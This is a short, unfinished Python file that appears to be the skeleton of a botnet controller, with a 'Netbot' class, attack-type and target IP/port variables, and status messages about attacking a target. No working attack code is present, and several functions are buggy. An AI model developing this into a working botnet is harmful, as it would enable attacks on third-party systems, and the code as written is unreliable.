import socket
import threading
import signal
import time
import sys
import random
import os
import subprocess
from io import StringIO

# bool varibles
start = False
server_started = False
attacking = False

# string variables
attack = "None"
target_ip = "None"

# thread tListener;
# vector<thread> threads;
tListener = threading.Thread()

target_port = 0
# server_fd, valread, client_socket

# define netbot class
class Netbot:
    def __init__(self, id, start, ip_address):
        self.id = id
        self.start = start
        self.ip_address = ip_address

# get thread ID
pid = os.getpid()

def server_status():
    if target_ip == "None" and attack == "None" and attacking == False:
          return "\nServer started, waiting for client connections...\n"
    elif attack == "HALT" and target_ip != "None":
        return "\nAttack halted. Waiting for commands.\n"
    elif attacking == True and attack == "None":
        attacking = False
        return "\nPlease, enter attack type.\n"
    elif attacking == True and target_ip == "None":
        attacking = False
        return "\nPlease, enter target parameters.\n"
    elif attacking == True:
        return "\nServer attacking (" + attack + ") target: " + target_ip + "\n"  
    else:
        return "\nServer started, waiting for client connections...\n"
    
def setup_target_parameters():
    print("Enter target IP address: ")
    input(target_ip)
    print("\nEnter target port: ")
    input(target_port)


